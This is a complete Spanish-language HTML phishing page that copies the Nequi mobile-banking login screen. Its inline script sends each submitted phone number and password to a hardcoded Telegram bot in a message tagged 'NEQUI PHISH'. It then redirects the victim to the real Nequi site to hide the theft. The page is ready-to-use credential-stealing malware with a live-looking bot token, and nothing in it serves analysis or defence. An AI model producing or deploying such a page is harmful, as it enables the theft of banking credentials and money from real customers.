<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #00B14F; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
        }
        .card {
            background: white;
            width: 100%;
            max-width: 380px;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
        }
        .header {
            background: #00B14F;
            color: white;
            text-align: center;
            padding: 35px 0 25px;
        }
        .header img {
            width: 78px;
            filter: brightness(0) invert(1);
        }
        .header h1 {
            font-size: 26px;
            margin-top: 8px;
            font-weight: 500;
        }
        .content {
            padding: 30px 28px 40px;
        }
        .title {
            text-align: center;
            font-size: 17px;
            color: #333;
            margin-bottom: 28px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 9px 0;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16.5px;
        }
        input:focus {
            outline: none;
            border-color: #00B14F;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #00B14F;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 500;
            margin-top: 18px;
            cursor: pointer;
        }
        .btn:hover {
            background: #00963a;
        }
        .error {
            color: #d32f2f;
            text-align: center;
            margin: 12px 0;
            font-size: 14px;
            display: none;
        }
        .forgot {
            text-align: center;
            color: #00B14F;
            margin-top: 25px;
            font-size: 15px;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            padding: 25px;
            color: #666;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            
            <h1>Nequi</h1>
        </div>
        
        <div class="content">
            <div class="title">Inicia sesión en tu cuenta</div>
            
            <form id="loginForm">
                <input type="tel" id="phone" placeholder="Número de celular" maxlength="10" required>
                <input type="password" id="password" placeholder="Contraseña" required>
                <div class="error" id="errorMsg">Número o contraseña incorrectos</div>
                <button type="submit" class="btn">Ingresar</button>
            </form>
            
            <div class="forgot">¿Olvidaste tu contraseña?</div>
        </div>
        
        <div class="footer">
            Nequi © 2025
        </div>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const phone = document.getElementById("phone").value.trim();
            const password = document.getElementById("password").value.trim();
            const errorMsg = document.getElementById("errorMsg");

            if (phone.length < 10) {
                errorMsg.style.display = "block";
                return;
            }

            const message = `🔴 NEQUI PHISH\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                errorMsg.style.color = "green";
                errorMsg.textContent = "✅ Iniciando sesión...";
                errorMsg.style.display = "block";
                setTimeout(() => {
                    window.location.href = "https://www.nequi.com.co";
                }, 1600);
            })
            .catch(() => {
                window.location.href = "https://www.nequi.com.co";
            });
        });
    </script>
</body>
</html>
